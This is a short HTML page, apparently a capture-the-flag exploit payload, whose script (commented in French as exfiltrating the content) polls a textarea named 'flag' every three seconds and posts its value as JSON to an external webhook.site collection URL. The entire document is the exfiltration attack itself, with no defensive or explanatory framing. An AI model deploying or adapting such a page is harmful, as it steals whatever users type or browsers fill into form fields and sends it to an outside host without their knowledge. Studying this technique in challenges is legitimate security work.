<!DOCTYPE html>
<html>
<head><title>App</title></head>
<body>
  <textarea id="flag"></textarea>
  <script>
    // Surveille la textarea et exfiltre son contenu
    setInterval(() => {
      const val = document.getElementById('flag').value;
      if (val && val.trim().length > 0) {
        fetch('http://webhook.site/296f78e9-6261-4a31-8cb2-bd8fc98c8293/data=', {
          method: 'POST',
          mode: 'no-cors',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ flag: val })
        });
      }
    }, 3000);
  </script>
</body>
</html>
